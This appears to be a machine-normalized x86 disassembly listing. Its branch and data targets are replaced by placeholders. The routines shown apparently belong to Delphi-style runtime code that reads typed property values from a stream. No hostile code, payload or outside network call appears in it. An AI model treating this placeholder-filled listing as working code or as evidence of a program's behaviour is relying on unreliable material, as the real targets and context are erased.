mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4106d0
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_4177c0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179b3
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edi ebx
jmp r-xdata
sub_4179bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413234
mov ebx eax
test ebx ebx
je r-xdata
call sub_41654c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410744
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417a04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415fe0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4136e4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417a44
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418bc8
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410be0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a9a
lea eax [ ebp - 0x10 ]
call sub_40e7b4
retn
sub_417aa0
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_416a50
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4174c0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415fe0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4136e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4184b0
lea eax [ ebp - 0x4 ]
call sub_4055a8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410c94
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b59
lea eax [ ebp - 0x8 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_4055a8
retn
sub_417b60
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e62
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x24 ]
call sub_40464c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f90
retn
jmp [ eax * 4 + jump_table_417bf0 ]
mov eax [ rw-data ]
call sub_416534
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106d0
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416a50
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b10
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410744
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4174c0
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4105fc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410744
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4173a4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4109d4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418310
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4108d4
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4183cc
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410900
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4181f4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410744
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416a50
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416a50
cmp al 0xd
jne r-xdata
push ebp
call sub_417a44
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41762c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410c58
jmp r-xdata
push ebp
call sub_417aa0
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106d0
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175c0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410744
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4174c0
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4179bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4184b0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410744
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_4174c0
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4184b0
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410c20
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4184b0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4106d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416b68
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410c20
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4174c0
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417a04
pop ecx
jmp r-xdata
sub_417e68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403fc0
jmp r-xdata
mov eax [ ebx ]
call sub_4133cc
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ec8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4182b0
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418182
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
mov eax [ ebp - 0x1c ]
call sub_412fa0
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_417e68
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_40317c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412cf0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405cd8
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4136e4
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41389c
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41810e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403234
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413840
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_418158
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a24
jmp r-xdata
call sub_4039d0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41625c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181c8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418187
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416404
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4039d0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181c8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403234
sub_4181f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418271
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4184b0
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4105a4
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41654c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416584
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182a5
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_4182d4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416a74
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40405c
mov eax esi
call j_sub_404438
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416a74
pop edx
pop esi
pop ebx
retn
sub_418310
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416a50
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4183cc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041f4
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183c4
lea eax [ ebp - 0x8 ]
call sub_40464c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4184b0
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416a74
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045b8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416a74
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416a74
jmp r-xdata
jmp r-xdata
call sub_41654c
sub_4183cc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416a50
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418310
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404798
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184aa
lea eax [ ebp - 0xc ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4184b0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416a74
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404894
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_416a74
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416a74
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045b8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416a74
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405978
jmp r-xdata
jmp r-xdata
call sub_41654c
sub_4184c4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4182d4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418507
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41850c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41670c
test al al
je r-xdata
mov eax [ ebx ]
call sub_4185c0
mov eax [ ebx ]
call sub_417678
pop ebx
pop ebp
retn
sub_418534
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416a74
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4189b8
pop ebx
pop ecx
pop ebp
retn
sub_418564
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41670c
test al al
je r-xdata
mov eax [ ebx ]
call sub_416a50
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417678
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_4189b8
jmp r-xdata
mov eax [ ebx ]
call sub_4185c0
mov eax [ ebx ]
call sub_41670c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41875c
mov eax [ ebx ]
call sub_417678
sub_4185c0
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4184b0
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418756
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
jmp [ eax * 4 + jump_table_4185f7 ]
push ebp
call sub_41850c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4182d4
jmp r-xdata
push ebp
mov eax 0x1
call sub_418534
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4184c4
jmp r-xdata
push ebp
mov eax 0x1
call sub_418534
pop ecx
jmp r-xdata
push ebp
call sub_418564
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
push ebp
mov eax 0x2
call sub_418534
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_4189b8
jmp r-xdata
push ebp
mov eax 0x1
call sub_418534
pop ecx
sub_41875c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4182d4
mov eax ebx
call sub_4185c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4187a0
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4187a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41670c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4182d4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4182d4
jmp r-xdata
mov eax ebx
call sub_41875c
mov eax ebx
call sub_417678
jmp r-xdata
mov eax ebx
call sub_41670c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4187a4
mov eax ebx
call sub_417678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418843
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
sub_41884c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404004
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4196e8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188f8
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
sub_41891c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418944
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_4169a4
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_412ee0
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403448
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_4169a4
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4189b8
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_416a74
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_416a74
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418a00
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4165d8
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416a74
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415504
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_416a74
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415e94
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418310
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_416a74
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415504
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_416a74
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_410244
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
lea eax [ ebp - 0x1c ]
call sub_4055a8
